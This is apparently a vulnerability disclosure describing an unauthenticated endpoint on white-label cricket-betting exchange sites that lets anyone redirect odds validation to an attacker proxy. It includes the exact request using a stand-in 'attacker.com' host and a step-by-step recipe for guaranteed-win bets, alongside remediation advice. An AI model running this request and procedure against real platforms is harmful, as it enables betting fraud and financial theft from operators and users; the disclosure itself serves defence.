# Zero-Auth Odds Source Override in White-Label Betting Platforms

**Severity:** Critical  
**Affected:** 50+ betting exchange sites running Node.js/MongoDB white-label stack  
**Discovered:** March-April 2026  
**Status:** Partially patched (some instances), most still vulnerable

---

## Summary

A critical zero-authentication API endpoint allows any user — or even an unauthenticated attacker — to rewrite the odds data source URL for any live cricket match. The server validates session bets against data fetched from this URL. By pointing it to an attacker-controlled proxy, arbitrary bet values are accepted.

## Technical Details

### The Endpoint

```
POST /v1/sports/updateMatchByMarketId
Content-Type: application/json

{
  "marketId": "1.257104784",
  "checkOddsUrl": "https://attacker.com/fake-odds",
  "cacheUrl": "https://attacker.com/fake-odds"
}
```

**No authentication required.** No JWT, no session cookie, no API key.

### How Odds Validation Works

```
Client places bet → Server fetches checkOddsUrl/cacheUrl → 
Validates bet run/rate against fetched data → Accepts or rejects
```

The server trusts whatever the configured URL returns. If `checkOddsUrl` points to an attacker's server, the attacker controls what odds the server sees.

### The Attack

1. Deploy a proxy that serves real odds data (pass-through from the legitimate cache)
2. Override `checkOddsUrl` AND `cacheUrl` for target match → attacker's proxy
3. Proxy modifies specific session run values (e.g., `runsYes: 50` instead of `65`)
4. Place bet at the manipulated value — server validates against proxy data, accepts
5. Restore original URLs immediately (< 3 seconds total)
6. Bet settles at real result → guaranteed win if manipulated correctly

### Key Implementation Details

- **Both URLs must be overridden**: `checkOddsUrl` AND `cacheUrl`. Some matches validate against one, some against the other.
- **The endpoint is POST, not GET**: despite being a read-modify-write operation
- **No rate limiting**: can be called thousands of times
- **Affects all matches**: any `marketId` can be modified
- **Instant effect**: server fetches from new URL on next bet validation

## Architecture

```
Legitimate flow:
  Client → API Server → vigcache.tresting.com (odds) → validate bet

Exploited flow:
  Attacker overrides URL via updateMatchByMarketId
  Client → API Server → attacker-proxy.com (modified odds) → bet accepted
  Attacker restores URL
  Bet settles at real result
```

## Impact

- **Financial**: Unlimited guaranteed-profit bets on any cricket match
- **Scope**: All users on the platform see modified odds during the attack window (typically < 3 seconds)
- **Stealth**: Bet history shows normal-looking values (the manipulated values are within plausible range)
- **Scale**: Can be automated across multiple matches and accounts simultaneously

## Affected Infrastructure

The white-label platform uses:
- **Backend**: Node.js + Express + MongoDB
- **Odds Cache**: `vigcache.tresting.com` / `1excache.tresting.com` / custom per-site
- **Real-time**: Socket.IO for live odds delivery
- **Frontend**: React/Preact SPA

Multiple betting exchange sites share this codebase. The vulnerability exists on all instances, but Cloudflare WAF blocks exploitation on some.

## Remediation

1. **Add authentication** to `updateMatchByMarketId` — require admin/superadmin JWT
2. **Whitelist allowed URLs** — only permit known cache domains (vigcache, 1excache)
3. **Remove the endpoint from client-facing API** — this is an admin operation, should only be on the admin panel API
4. **Add URL validation** — reject non-HTTPS, non-whitelisted domains
5. **Audit logging** — log all URL changes with timestamp and source IP
6. **Rate limiting** — flag rapid URL changes as suspicious

## Timeline

- **March 2026**: Vulnerability discovered during authorized penetration test
- **March 2026**: Initial disclosure attempted to platform operators
- **April 2026**: Confirmed on 3+ independent instances
- **April 2026**: One instance (api.ons3.co) patched — endpoint removed entirely
- **April 2026**: Other instances remain unpatched

---

*This write-up is published as part of authorized security research. No live credentials, active exploit code, or site-specific details are included. All testing was conducted with explicit authorization.*

*Contact: @swarmesh_net on Telegram*
